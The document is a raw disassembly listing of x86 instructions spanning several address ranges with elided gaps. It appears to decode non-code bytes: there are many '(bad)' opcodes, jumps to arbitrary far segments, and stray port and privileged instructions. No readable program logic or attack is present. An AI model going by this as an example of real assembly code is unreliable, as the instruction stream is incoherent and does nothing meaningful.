  42dd5b:	or     BYTE PTR [eax],0xb5
  42dd5e:	push   esi
  42dd5f:	scas   eax,DWORD PTR es:[edi]
  42dd60:	ficomp WORD PTR [esi]
  42dd62:	sub    DWORD PTR ds:0xb8d9771b,edx
  42dd68:	dec    esp
  42dd69:	push   cs
  42dd6a:	or     al,0x61
  42dd6c:	jb     0x42dd7f
  42dd6e:	jno    0x42dd64
  42dd70:	sahf   
  42dd71:	inc    ecx
  42dd72:	push   eax
  42dd73:	rol    DWORD PTR [edi],0x46
  42dd76:	retf   
  42dd77:	push   ss
  42dd78:	retf   0xa3e0
  42dd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd7c:	mov    dh,0x53
  42dd7e:	add    eax,0xdf7831f
  42dd83:	out    0x1f,al
  42dd85:	jg     0x42dd49
  42dd87:	enter  0x1b1b,0x49
  42dd8b:	clc    
  42dd8c:	dec    esp
  42dd8d:	mov    ds:0x42d88ff6,eax
  42dd92:	ss lahf 
  42dd94:	mov    ebp,DWORD PTR [ecx]
  42dd96:	mov    edx,0xd9f0fc79
  42dd9b:	adc    edx,DWORD PTR [ecx+0x3d5c759]
  42dda1:	sbb    eax,0xa02d52f4
  42dda6:	out    dx,eax
  42dda7:	in     eax,0x9d
  42dda9:	sbb    BYTE PTR [esp+esi*4],dh
  42ddac:	lock mov eax,0x4dd53996
  42ddb2:	mov    edx,DWORD PTR [esi]
  42ddb4:	or     al,0xf7
  42ddb6:	sub    bh,ah
  42ddb8:	adc    eax,DWORD PTR [esi+0x21]
  42ddbb:	std    
  42ddbc:	cmp    esp,DWORD PTR [edi+0x7b206b20]
  42ddc2:	xchg   edi,eax
  42ddc3:	pushf  
  42ddc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddc5:	xchg   edx,eax
  42ddc6:	inc    edx
  42ddc7:	and    BYTE PTR [edi+0x2ac8aa2f],0x25
  42ddce:	dec    esp
  42ddcf:	jo     0x42dd6a
  42ddd1:	into   
  42ddd2:	nop
  42ddd3:	adc    al,0xdd
  42ddd5:	inc    esp
  42ddd6:	es push es
  42ddd8:	dec    edi
  42ddd9:	inc    ebp
  42ddda:	test   bl,dh
  42dddc:	leave  
  42dddd:	sbb    eax,0xc6cf1e68
  42dde2:	pop    es
  42dde3:	push   cs
  42dde4:	rol    ebx,1
  42dde6:	push   DWORD PTR [ebp+0x3d5d4c3e]
  42ddec:	scas   eax,DWORD PTR es:[edi]
  42dded:	data16 sbb bh,bl
  42ddf0:	and    DWORD PTR [edi],ebp
  42ddf2:	pop    eax
  42ddf3:	cmp    al,0x32
  42ddf5:	mov    BYTE PTR [ebx-0x68f676c],cl
  42ddfb:	fistp  WORD PTR [eax]
  42ddfd:	jl     0x42ddb3
  42ddff:	mov    ebx,ds
  42de01:	add    BYTE PTR [edi],bl
  42de03:	fbstp  TBYTE PTR [eax-0x71e23dcc]
  42de09:	adc    BYTE PTR ds:0xc518114b,bh
  42de0f:	sar    BYTE PTR [ebx],cl
  42de11:	test   al,0xa0
  42de13:	rol    BYTE PTR [ebx+0x59],0xaf
  42de17:	cmp    bl,BYTE PTR [ebx]
  42de19:	fs dec ebx
  42de1b:	jle    0x42dd9e
  42de1d:	jo     0x42de69
  42de1f:	loopne 0x42de22
  42de21:	fcmovnb st,st(6)
  42de23:	and    al,0x76
  42de25:	push   edx
  42de26:	(bad)  
  42de27:	test   eax,0xb0078402
  42de2c:	mul    DWORD PTR [eax+0x1a]
  42de2f:	jnp    0x42de97
  42de31:	and    DWORD PTR [esi+0x1b098d48],ebx
  42de37:	aas    
  42de38:	ja     0x42de4e
  42de3a:	and    al,0xf7
  42de3c:	fstp   QWORD PTR [edx+0xe]
  42de3f:	and    al,0xe3
  42de41:	dec    esp
	...
  42deb2:	add    BYTE PTR [eax],al
  42deb4:	jae    0x42def3
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0x7e0f5e0c]
  42dec3:	pop    edi
  42dec4:	push   ds
  42dec5:	out    0x1,al
  42dec7:	add    dh,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [ecx],ah
  42decd:	je     0x42debe
  42decf:	mov    eax,0x236f1b70
  42ded4:	push   ebp
  42ded5:	mov    ds:0x9b1c2101,al
  42deda:	inc    edi
  42dedb:	jp     0x42de8c
  42dedd:	mov    ds:0x1b702ea6,eax
  42dee2:	cld    
  42dee3:	dec    ebp
  42dee4:	cmovl  edi,DWORD PTR [edi+0x3d2c3bda]
  42deeb:	mov    ecx,0x6099aa4a
  42def0:	lahf   
  42def1:	push   ebx
  42def2:	sar    BYTE PTR [esi],cl
  42def4:	mov    eax,0x46c04391
  42def9:	xor    al,0xc2
  42defb:	je     0x42dee5
  42defd:	adc    dl,BYTE PTR [ecx]
  42deff:	js     0x42dea3
  42df01:	call   0xa92c:0x2d3d0eb3
  42df08:	imul   edx,edi,0x710e57d7
  42df0e:	sub    ebx,DWORD PTR [ebp+0x61]
  42df11:	xor    al,0x20
  42df13:	adc    DWORD PTR [esi+0x2654a765],ebp
  42df19:	pop    ecx
  42df1a:	repz aas 
  42df1c:	lods   al,BYTE PTR ds:[esi]
  42df1d:	test   DWORD PTR ds:0x907e2b7c,0x1244eb16
  42df27:	ror    DWORD PTR [ebp-0x42],0x99
  42df2b:	sub    ah,BYTE PTR [ecx-0x50]
  42df2e:	jb     0x42defd
  42df30:	jmp    0x576e:0xf481f89e
  42df37:	pop    ss
  42df38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df39:	imul   ebx,DWORD PTR [ecx+0x3f],0x4a
  42df3d:	xchg   esp,eax
  42df3e:	or     BYTE PTR [edx-0x5b821421],ah
  42df44:	shl    BYTE PTR [esi],0x12
  42df47:	ja     0x42df18
  42df49:	fld    TBYTE PTR [esp+esi*2]
  42df4c:	mov    ah,bl
  42df4e:	fisttp WORD PTR [edx+0x7a]
  42df51:	es popf 
  42df53:	dec    eax
  42df54:	scas   eax,DWORD PTR es:[edi]
  42df55:	imul   esi,DWORD PTR [ecx],0x80ce6883
  42df5b:	sub    edx,ebp
  42df5d:	(bad)  
  42df5e:	jmp    0x42df71
  42df60:	pop    edi
  42df61:	jl     0x42df8d
  42df63:	int3   
  42df64:	gs push ss
  42df66:	push   eax
  42df67:	add    ebx,DWORD PTR [ebp+ecx*8+0x36]
  42df6b:	mov    ecx,DWORD PTR [edx]
  42df6d:	pusha  
  42df6e:	out    dx,al
  42df6f:	out    dx,eax
  42df70:	mov    ah,0x4
  42df72:	mov    bh,0x72
  42df74:	enter  0xcc2a,0x31
  42df78:	mov    ebx,0xae4dff5
  42df7d:	xchg   edx,eax
  42df7e:	xchg   BYTE PTR [bx+si+0x1c89],bh
  42df83:	ret    
  42df84:	pop    eax
  42df85:	mov    BYTE PTR [ebx-0x347cd320],ah
  42df8b:	adc    DWORD PTR [ebp+ecx*8+0x5c],0xdca45d59
  42df93:	into   
  42df94:	dec    ebp
  42df95:	mov    edi,0x54309cb3
  42df9a:	outs   dx,DWORD PTR ds:[esi]
  42df9b:	xchg   ecx,eax
  42df9c:	(bad)  
  42df9d:	outs   dx,BYTE PTR ds:[esi]
  42df9e:	push   esp
  42df9f:	repnz pop esi
  42dfa1:	adc    esi,ebx
  42dfa3:	push   es
  42dfa4:	dec    esp
  42dfa5:	xchg   edi,eax
  42dfa6:	retf   0xbb82
  42dfa9:	push   ebx
  42dfaa:	add    eax,0x16e63a22
  42dfaf:	sub    cl,BYTE PTR [edx]
  42dfb1:	xor    al,0x8f
  42dfb3:	adc    ch,bh
  42dfb5:	repz fstp st(2)
  42dfb8:	scas   al,BYTE PTR es:[edi]
  42dfb9:	dec    ebx
  42dfba:	sbb    di,WORD PTR [ebx+eiz*4+0x57]
  42dfbf:	mov    al,ds:0xa84e
	...
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx-0x2b9bd31e],0xd9
  42e044:	adc    al,0xe7
  42e046:	add    DWORD PTR [eax],eax
  42e048:	test   BYTE PTR [eax],0x0
  42e04b:	add    BYTE PTR [esi+0x74],bl
  42e04e:	push   cs
  42e04f:	in     al,dx
  42e050:	cli    
  42e051:	mov    edx,DWORD PTR [ebp-0x69a3fb2d]
  42e057:	xor    BYTE PTR ds:0xced54b9d,al
  42e05d:	ins    DWORD PTR es:[edi],dx
  42e05e:	fstp   st(2)
  42e060:	lahf   
  42e061:	lahf   
  42e062:	pop    edx
  42e063:	test   al,0x12
  42e065:	adc    DWORD PTR [edx],esi
  42e067:	js     0x42e08c
  42e069:	ret    
  42e06a:	aaa    
  42e06b:	ss push ss
  42e06d:	jl     0x42e044
  42e06f:	mov    esi,DWORD PTR [eax-0x3e]
  42e072:	mov    al,0x7f
  42e074:	fdivr  st,st(7)
  42e076:	or     eax,ebx
  42e078:	mov    al,0x34
  42e07a:	xor    al,0x1a
  42e07c:	mov    eax,0x4e22fcf2
  42e081:	div    BYTE PTR [ecx]
  42e083:	or     ebx,edx
  42e085:	push   ebx
  42e086:	adc    BYTE PTR [ebx+0x7e],dh
  42e089:	jge    0x42e022
  42e08b:	outs   dx,DWORD PTR ds:[esi]
  42e08c:	out    dx,eax
  42e08d:	mov    ah,0x81
  42e08f:	and    ch,cl
  42e091:	xchg   edx,eax
  42e092:	mov    al,0x91
  42e094:	mov    esp,DWORD PTR [eax+0x50]
  42e097:	xor    eax,0xc24fcad6
  42e09c:	lock push es
  42e09e:	push   eax
  42e09f:	scas   al,BYTE PTR es:[edi]
  42e0a0:	cld    
  42e0a1:	xor    dl,dl
  42e0a3:	dec    BYTE PTR [ebx-0x6b]
  42e0a6:	loopne 0x42e0e9
  42e0a8:	inc    si
  42e0aa:	push   es
  42e0ab:	rcr    DWORD PTR [edi+0x34],cl
  42e0ae:	pushf  
  42e0af:	dec    eax
  42e0b0:	push   esi
  42e0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0b2:	push   es
  42e0b3:	inc    ebx
  42e0b4:	pop    es
  42e0b5:	iret   
  42e0b6:	call   FWORD PTR [ebx]
  42e0b8:	call   edx
  42e0ba:	inc    ecx
  42e0bb:	std    
  42e0bc:	call   0x1813e545
  42e0c1:	jbe    0x42e06e
  42e0c3:	loopne 0x42e08a
  42e0c5:	imul   ecx,DWORD PTR [ebx],0x29
  42e0c8:	and    eax,0xfe91023d
  42e0cd:	(bad)  
  42e0ce:	mov    esp,0x2795ab84
  42e0d3:	sub    al,BYTE PTR [eax]
  42e0d5:	mov    ebp,0xf7cefcb3
  42e0da:	rcl    BYTE PTR [ebx-0x40],0xe3
  42e0de:	adc    eax,0x13f12ea8
  42e0e3:	ins    BYTE PTR es:[edi],dx
  42e0e4:	in     al,0xbe
  42e0e6:	xchg   ebp,eax
  42e0e7:	daa    
  42e0e8:	jne    0x42e15f
  42e0ea:	out    0xa6,eax
  42e0ec:	retf   0xbcd0
  42e0ef:	(bad)  
  42e0f0:	loop   0x42e09d
  42e0f2:	jno    0x42e100
  42e0f4:	cmp    eax,0x796c52f6
  42e0f9:	loop   0x42e12a
  42e0fb:	push   es
  42e0fc:	(bad)  
  42e0fd:	(bad)  
  42e0fe:	xor    DWORD PTR [edx],ebp
  42e100:	repz cmp DWORD PTR [edx+0x131bf501],0x53a39b87
  42e10b:	das    
  42e10c:	cwde   
  42e10d:	jmp    0xa4772c3a
  42e112:	and    edx,eax
  42e114:	in     eax,0xaf
  42e116:	in     eax,dx
  42e117:	mov    esp,0xc8f1dcc9
  42e11c:	out    0xdf,al
  42e11e:	mov    ebp,0x1b112352
  42e123:	xchg   ebp,eax
  42e124:	popf   
  42e125:	fs je  0x42e126
  42e128:	pop    es
  42e129:	jnp    0x42e159
  42e12b:	xor    ebp,eax
  42e12d:	popf   
  42e12e:	mov    cl,0x27
  42e130:	aad    0x5a
  42e132:	adc    ecx,ecx
  42e134:	mov    al,0x94
  42e136:	fist   WORD PTR [ebx-0x3cf7afd1]
  42e13c:	(bad)  
  42e13d:	push   eax
  42e13e:	pop    ebx
  42e13f:	dec    ebp
  42e140:	adc    bl,BYTE PTR [edi+0x0]
	...
  42e1b3:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0x82a2cb71
  42e1c3:	sahf   
  42e1c4:	or     ch,al
  42e1c6:	add    DWORD PTR [eax],eax
  42e1c8:	test   BYTE PTR [eax],0x0
  42e1cb:	add    BYTE PTR [ebp+0x27],cl
  42e1ce:	add    ch,bl
  42e1d0:	fldcw  WORD PTR [edx]
  42e1d2:	sub    al,0x75
  42e1d4:	pop    ecx
  42e1d5:	test   DWORD PTR [ebp+ebx*8+0x715be108],0x1e34d944
  42e1e0:	sub    BYTE PTR ds:0x425abba,bh
  42e1e6:	push   cs
  42e1e7:	xor    BYTE PTR [eax],0x9e
  42e1ea:	xchg   esp,eax
  42e1eb:	std    
  42e1ec:	add    ebp,DWORD PTR [ecx+0x6d9a6445]
  42e1f2:	cwde   
  42e1f3:	pop    esi
  42e1f4:	not    ah
  42e1f6:	fld    DWORD PTR [edi+edi*8-0xc]
  42e1fa:	es pop edx
  42e1fc:	stos   DWORD PTR es:[edi],eax
  42e1fd:	sub    DWORD PTR [ebp+0x6be0dbae],eax
  42e203:	lahf   
  42e204:	retf   0x9d96
  42e207:	add    ebp,DWORD PTR ds:0x1c5bf142
  42e20d:	rcl    DWORD PTR [ebp+0x25],cl
  42e210:	jl     0x42e290
  42e212:	in     al,dx
  42e213:	ja     0x42e20d
  42e215:	sbb    ch,dh
  42e217:	fwait
  42e218:	out    dx,al
  42e219:	lods   al,BYTE PTR ds:[esi]
  42e21a:	add    al,BYTE PTR [ebx-0x20]
  42e21d:	inc    esi
  42e21e:	call   0x8fa:0xeda92183
  42e225:	lods   eax,DWORD PTR ds:[esi]
  42e226:	adc    dh,cl
  42e228:	dec    edi
  42e229:	(bad)  
  42e22a:	sub    al,0xf
  42e22c:	add    eax,0x1f249ff5
  42e231:	xor    ebp,DWORD PTR [ecx-0x4ec8581]
  42e237:	out    0x43,al
  42e239:	shl    BYTE PTR [edx],1
  42e23b:	bound  ebp,QWORD PTR [ebp+0x58a52797]
  42e241:	push   0xecea61b0
  42e246:	lahf   
  42e247:	loope  0x42e2b1
  42e249:	lds    ebx,FWORD PTR [ecx]
  42e24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e24c:	push   ebx
  42e24d:	in     al,0xba
  42e24f:	dec    ecx
  42e250:	jge    0x42e2b1
  42e252:	jb     0x42e244
  42e254:	out    dx,eax
  42e255:	call   0x17d32ba6
  42e25a:	enter  0x3952,0x49
  42e25e:	out    dx,eax
  42e25f:	neg    BYTE PTR [edx-0x60f9f56f]
  42e265:	lods   eax,DWORD PTR ds:[esi]
  42e266:	cmovbe ebx,DWORD PTR [edi-0x207c73e3]
  42e26d:	lock adc al,0xda
  42e270:	cmp    eax,0x16cb1c4b
  42e275:	sti    
  42e276:	push   edi
  42e277:	ins    DWORD PTR es:[edi],dx
  42e278:	js     0x42e26b
  42e27a:	test   al,0x2
  42e27c:	mov    bh,0x1f
  42e27e:	loop   0x42e26c
  42e280:	sbb    esp,edx
  42e282:	hlt    
  42e283:	sti    
  42e284:	repnz arpl WORD PTR [ecx],cx
  42e287:	adc    al,dl
  42e289:	test   cl,ch
  42e28b:	xor    al,0x0
  42e28d:	iret   
  42e28e:	mov    ecx,0x2891976b
  42e293:	jecxz  0x42e263
  42e295:	cli    
  42e296:	cmc    
  42e297:	fsub   st,st(5)
  42e299:	cmp    DWORD PTR [esi-0x68],esp
  42e29c:	imul   ebp,DWORD PTR [ebx*4+0x1d6f5e33],0xc1e74c12
  42e2a7:	pop    eax
  42e2a8:	mov    ds:0xd7fde07,eax
  42e2ad:	aas    
  42e2ae:	inc    ebx
  42e2af:	mov    edx,0x12f77010
  42e2b4:	dec    esp
  42e2b5:	mov    ah,0xcc
  42e2b7:	rol    DWORD PTR [ebp-0x41],1
  42e2ba:	addr16 mov bh,0x75
  42e2bd:	aas    
  42e2be:	and    eax,0xe89f4c
	...
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     esp,eax
  42e341:	sar    BYTE PTR [edi],cl
  42e343:	rol    DWORD PTR [eax],cl
  42e345:	jmp    0x138e34b
  42e34a:	add    BYTE PTR [eax],al
  42e34c:	mov    esi,0x3d7ffad5
  42e351:	jge    0x42e397
  42e353:	add    BYTE PTR [esi-0x78],ah
  42e356:	pop    ss
  42e357:	in     eax,dx
  42e358:	jmp    0x5149:0xe9448db7
  42e35f:	retf   0x72b9
  42e362:	sti    
  42e363:	jl     0x42e3a4
  42e365:	xchg   esp,eax
  42e366:	mov    edi,0xdd18b84f
  42e36b:	jmp    0x42e34f
  42e36d:	icebp  
  42e36e:	mov    bh,0x8c
  42e370:	sbb    BYTE PTR [ebx-0xe],ch
  42e373:	int3   
  42e374:	nop
  42e375:	test   al,0xe3
  42e377:	push   ds
  42e378:	adc    DWORD PTR [edx],esp
  42e37a:	jo     0x42e355
  42e37c:	cmp    bl,ch
  42e37e:	or     DWORD PTR [ebx+0x33bb7d9c],edx
  42e384:	call   0xef48c5c9
  42e389:	mov    al,0xcb
  42e38b:	pushf  
  42e38c:	and    bl,al
  42e38e:	in     al,dx
  42e38f:	test   DWORD PTR [edi-0x5d193545],ecx
  42e395:	je     0x42e3c9
  42e397:	lahf   
  42e398:	(bad)  
  42e39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e39b:	xchg   ebp,eax
  42e39c:	adc    al,0xc6
  42e39e:	lahf   
  42e39f:	sar    BYTE PTR [ebx+ecx*4-0x5865c686],0xc4
  42e3a7:	mov    DWORD PTR [esi-0x63],edi
  42e3aa:	loop   0x42e337
  42e3ac:	js     0x42e394
  42e3ae:	dec    edi
  42e3af:	xchg   esi,eax
  42e3b1:	ins    DWORD PTR es:[edi],dx
  42e3b2:	outs   dx,BYTE PTR ds:[esi]
  42e3b3:	cld    
  42e3b4:	lods   eax,DWORD PTR ds:[esi]
  42e3b5:	inc    esp
  42e3b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3b7:	arpl   WORD PTR [edi+0x349795b6],ax
  42e3bd:	dec    ecx
  42e3be:	cmp    edx,DWORD PTR [ebx+0x3a]
  42e3c1:	cmp    eax,0xac38ca95
  42e3c6:	test   eax,0xd1efea59
  42e3cb:	push   es
  42e3cc:	dec    ebx
  42e3cd:	add    al,0xc
  42e3cf:	cmp    al,0x5f
  42e3d1:	xor    eax,0x2c78e9e2
  42e3d6:	jnp    0x42e38c
  42e3d8:	jp     0x42e396
  42e3da:	mov    eax,ds:0x2951b42d
  42e3df:	retf   0xa8c5
  42e3e2:	pop    edx
  42e3e3:	sbb    BYTE PTR [ebp+0x52fe6b77],ah
  42e3e9:	sub    DWORD PTR [ebp+0x68],ecx
  42e3ec:	inc    esi
  42e3ed:	fdivr  st,st(0)
  42e3ef:	add    eax,0x581fc19e
  42e3f4:	jb     0x42e432
  42e3f6:	mov    WORD PTR [ecx-0xc],cs
  42e3f9:	mov    dl,0x41
  42e3fb:	cmp    cl,BYTE PTR [ebx]
  42e3fd:	jne    0x42e3c2
  42e3ff:	repnz inc ebx
  42e401:	iret   
  42e402:	mov    ch,0xf8
  42e404:	mov    ch,0x17
  42e406:	jo     0x42e3ee
  42e408:	push   ds
  42e409:	push   ebp
  42e40a:	xchg   edx,eax
  42e40b:	int3   
  42e40c:	out    0x38,eax
  42e40e:	stos   BYTE PTR es:[edi],al
  42e40f:	aam    0xc4
  42e411:	add    DWORD PTR [edx-0x5162fedd],ecx
  42e417:	adc    bh,BYTE PTR [ebx]
  42e419:	adc    esp,edi
  42e41b:	xchg   edx,eax
  42e41c:	fsubrp st(2),st
  42e41e:	xchg   ecx,eax
  42e41f:	mov    ebp,0x68ea7ae5
  42e424:	clc    
  42e425:	mov    esi,0xfd09ce76
  42e42a:	jbe    0x42e469
  42e42c:	cs dec ebp
  42e42e:	add    DWORD PTR [ebx],edi
  42e430:	fmulp  st(0),st
  42e432:	ja     0x42e3d6
  42e434:	and    dh,bh
  42e436:	adc    edi,ebx
  42e438:	sbb    cl,dl
  42e43a:	mov    WORD PTR [eax+0xe],ss
  42e43d:	cwde   
  42e43e:	inc    ebp
  42e43f:	mov    cl,0x1a
  42e441:	sbb    DWORD PTR [eax],eax
	...
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0xda4e441
  42e4c4:	imul   cl
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	test   BYTE PTR [eax],0x0
  42e4cb:	add    BYTE PTR [ecx],bh
  42e4cd:	arpl   WORD PTR [esi],bp
  42e4cf:	bound  esi,QWORD PTR [edi+0x2e79b92d]
  42e4d5:	shr    dh,cl
  42e4d7:	mov    cl,0xed
  42e4d9:	div    DWORD PTR [ebp+eiz*1-0x5e]
  42e4dd:	loopne 0x42e50b
  42e4df:	jl     0x42e52a
  42e4e1:	jno    0x42e510
  42e4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4e4:	jne    0x42e479
  42e4e6:	jnp    0x42e4f5
  42e4e8:	inc    eax
  42e4e9:	sbb    esp,ebp
  42e4eb:	mov    al,ds:0xd60b529c
  42e4f0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42e4f2:	or     BYTE PTR [edi-0x384a4a2a],dh
  42e4f8:	mov    dl,0x54
  42e4fa:	jo     0x42e4bc
  42e4fc:	xchg   DWORD PTR [esi-0x50],edi
  42e4ff:	fwait
  42e500:	mov    edi,0x786e88c
  42e505:	out    dx,al
  42e506:	pop    edi
  42e507:	jb     0x42e4ae
  42e509:	sbb    dh,ch
  42e50b:	adc    DWORD PTR [ebx+0x38c7f4f6],edx
  42e511:	push   esp
  42e512:	rcr    DWORD PTR [esp+edi*8],cl
  42e515:	out    dx,eax
  42e516:	cwde   
  42e517:	call   0xb22c:0x1ce17558
  42e51e:	ficom  DWORD PTR [ebx+0x32]
  42e521:	xchg   esi,edi
  42e523:	adc    al,0xfd
  42e525:	sbb    ah,BYTE PTR ds:0xce24f85a
  42e52b:	les    ecx,FWORD PTR [ebx+edi*4]
  42e52e:	xchg   cx,ax
  42e530:	mov    edi,ss
  42e532:	xchg   ecx,eax
  42e533:	scas   eax,DWORD PTR es:[edi]
  42e534:	mov    bl,0x95
  42e536:	int    0x7
  42e538:	or     al,0x10
  42e53a:	pop    DWORD PTR [ebx]
  42e53c:	xlat   BYTE PTR ds:[ebx]
  42e53d:	xchg   ebx,eax
  42e53e:	push   ss
  42e53f:	mov    DWORD PTR [eax],esp
  42e541:	test   al,0xd3
  42e543:	sub    eax,0x2e98ba7d
  42e548:	jmp    0x42e51c
  42e54a:	cmp    eax,0xb60e25cf
  42e54f:	outs   dx,BYTE PTR ds:[esi]
  42e550:	jmp    0xb813f25f
  42e555:	imul   DWORD PTR es:[eax]
  42e558:	bound  edx,QWORD PTR [ebx+0x160095c6]
  42e55e:	fwait
  42e55f:	mov    ah,BYTE PTR [edi-0x49]
  42e562:	xchg   ecx,eax
  42e563:	ds in  eax,0xb0
  42e566:	xchg   ecx,eax
  42e567:	les    ecx,FWORD PTR [ecx]
  42e569:	(bad)  
  42e56a:	dec    esi
  42e56b:	test   DWORD PTR [eax+0x45],esp
  42e56e:	and    dh,BYTE PTR ds:0x8792e7dc
  42e574:	cwde   
  42e575:	sbb    ebx,esp
  42e577:	jge    0x42e55f
  42e579:	mov    ch,0x58
  42e57b:	jp     0x42e507
  42e57d:	imul   esi,eax,0x31ab4638
  42e583:	cwde   
  42e584:	lods   eax,DWORD PTR ds:[esi]
  42e585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e586:	pushf  
  42e587:	js     0x42e5a6
  42e589:	mov    dl,0x72
  42e58b:	call   0x6cd8:0xc2438819
  42e592:	ins    BYTE PTR es:[edi],dx
  42e593:	add    bh,dh
  42e595:	mov    ds:0x8de1988b,al
  42e59b:	and    dh,dh
  42e59d:	or     al,0x7f
  42e59f:	imul   esp,DWORD PTR [edx+0x64],0x4e8b5597
  42e5a6:	xchg   esp,eax
  42e5a7:	inc    ebp
  42e5a8:	mov    ebp,0x34d82dc4
  42e5ad:	call   0x2b11:0x8bd6130
  42e5b4:	pop    ss
  42e5b5:	jae    0x42e597
  42e5b7:	ja     0x42e5ad
  42e5b9:	pop    esi
  42e5ba:	push   esi
  42e5bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5bc:	(bad)  
  42e5bd:	in     al,0xdf
  42e5bf:	mov    al,ds:0x4aea
	...
  42e634:	repz add esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	adc    eax,esp
  42e642:	lea    esp,[ebx-0x14]
  42e645:	jmp    0x0:0xf60001
  42e64c:	push   esp
  42e64d:	jns    0x42e679
  42e64f:	and    DWORD PTR [edx+0x3e2c05c7],edi
  42e655:	out    dx,al
  42e656:	mov    esp,0xd017ce96
  42e65b:	jmp    0xc64f50cb
  42e660:	inc    ebx
  42e661:	scas   eax,DWORD PTR es:[edi]
  42e662:	jmp    0x84a52190
  42e667:	(bad)  
  42e669:	xchg   edx,esi
  42e66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e66c:	dec    esp
  42e66d:	add    DWORD PTR [edx-0x243ec9c2],esp
  42e673:	in     eax,dx
  42e674:	dec    ebp
  42e675:	ds mov cl,0xfc
  42e678:	jle    0x42e618
  42e67a:	push   ecx
  42e67b:	pop    es
  42e67c:	or     eax,0x3f456288
  42e681:	sti    
  42e682:	or     eax,0x47251794
  42e687:	leave  
  42e688:	sahf   
  42e689:	jne    0x42e6da
  42e68b:	fwait
  42e68c:	or     edx,edi
  42e68e:	outs   dx,BYTE PTR ds:[esi]
  42e68f:	pop    ecx
  42e690:	stos   DWORD PTR es:[edi],eax
  42e691:	hlt    
  42e692:	in     al,0xc4
  42e694:	jno    0x42e646
  42e696:	push   ebp
  42e697:	cdq    
  42e698:	shl    BYTE PTR [edi+0x11],0xbd
  42e69c:	dec    eax
  42e69d:	idiv   bh
  42e69f:	cwde   
  42e6a0:	or     edi,DWORD PTR [eax-0x75656041]
  42e6a6:	adc    al,0xf5
  42e6a8:	jle    0x42e6b4
  42e6aa:	fimul  WORD PTR [edi+ebp*4-0x63]
  42e6ae:	or     eax,esp
  42e6b0:	cmc    
  42e6b1:	jmp    0xb831c9c0
  42e6b6:	pushf  
  42e6b7:	xor    al,BYTE PTR [esi+0x3ba46412]
  42e6bd:	jb     0x42e679
  42e6bf:	into   
  42e6c0:	xchg   ebp,eax
  42e6c1:	xchg   DWORD PTR [edx],esp
  42e6c3:	xchg   esp,eax
  42e6c4:	inc    eax
  42e6c5:	xor    al,0x8b
  42e6c7:	arpl   WORD PTR [ebp+0x3826995f],di
  42e6cd:	mov    edx,0x8eac9345
  42e6d2:	dec    esi
  42e6d3:	jmp    0x42e65a
  42e6d5:	inc    ebp
  42e6d6:	mov    ebp,0x2f8c80fa
  42e6db:	pop    es
  42e6dc:	ins    DWORD PTR es:[edi],dx
  42e6dd:	lods   al,BYTE PTR ds:[esi]
  42e6de:	pop    edx
  42e6df:	add    ah,BYTE PTR [esi]
  42e6e1:	test   BYTE PTR [ebx+0x6add8203],0xe
  42e6e8:	jecxz  0x42e6a2
  42e6ea:	and    eax,0x6b300066
  42e6ef:	loop   0x42e748
  42e6f1:	push   esi
  42e6f2:	lds    ecx,FWORD PTR [eax+0x3484004a]
  42e6f8:	ja     0x42e777
  42e6fa:	adc    dl,BYTE PTR [eax+0x78]
  42e6fd:	out    0x22,eax
  42e6ff:	fsubr  QWORD PTR [eax]
  42e701:	shl    BYTE PTR [esi+0x234c6f34],1
  42e707:	jl     0x42e705
  42e709:	in     al,dx
  42e70a:	and    esp,edx
  42e70c:	inc    eax
  42e70d:	mov    BYTE PTR [esi],dl
  42e70f:	popf   
  42e710:	out    dx,eax
  42e711:	add    ecx,DWORD PTR [esi+0x5ad0da62]
  42e717:	push   ebx
  42e718:	push   es
  42e719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e71a:	mov    ebx,0x5f880f26
  42e71f:	in     eax,dx
  42e720:	call   0x59b3:0xf77f6979
  42e727:	push   edx
  42e728:	sub    BYTE PTR [ecx-0x7ea9d4e4],bh
  42e72e:	data16 lahf 
  42e730:	call   0x1b759ee9
  42e735:	dec    BYTE PTR [ecx+0x9]
  42e738:	mov    ebx,0xa9408438
  42e73d:	(bad)  
  42e740:	loopne 0x42e7bf
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi-0x28f2aa8a]
